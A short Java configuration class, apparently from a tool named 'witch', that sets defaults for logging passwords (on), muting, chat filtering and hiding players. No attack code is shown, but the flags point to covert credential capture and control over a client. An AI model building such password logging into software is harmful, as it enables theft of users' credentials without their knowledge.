package me.soda.witch.config;

import java.util.ArrayList;
import java.util.List;

public class Config {
    public static boolean passwordBeingLogged;
    public static boolean isMuted;
    public static boolean isBeingFiltered;
    public static String filterPattern;
    public static boolean vanish;
    public static List<String> vanishedPlayers;

    static {
        passwordBeingLogged = true;
        isMuted = false;
        isBeingFiltered = false;
        filterPattern = "hello";
        vanish = false;
        vanishedPlayers = new ArrayList<>();
    }
}
